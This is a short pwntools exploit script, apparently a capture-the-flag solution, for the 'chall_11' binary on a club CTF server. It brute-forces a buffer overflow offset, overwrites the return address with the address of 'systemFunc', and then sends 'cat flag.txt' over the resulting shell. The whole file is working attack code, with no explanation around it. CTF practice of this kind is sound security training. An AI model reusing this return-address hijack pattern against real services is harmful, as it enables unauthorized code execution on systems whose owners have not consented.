from pwn import *

path_to_binary = "./challenge/chall_11"
EXE = ELF(path_to_binary)
context.binary = EXE
# context.log_level = "DEBUG"

win_address = EXE.symbols['systemFunc']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13383)
	return r

for offset in range(50, 100):
	io = conn(False)

	io.recvline()
	io.sendline(b'bananas')

	payload = b"a"*offset+p32(win_address)

	io.sendline(payload)

	try:
		data = io.recv(timeout=0.1)
		print(offset)
		io.sendline(b'cat flag.txt')
		print(io.recvline())
		break
	except EOFError:
		io.close()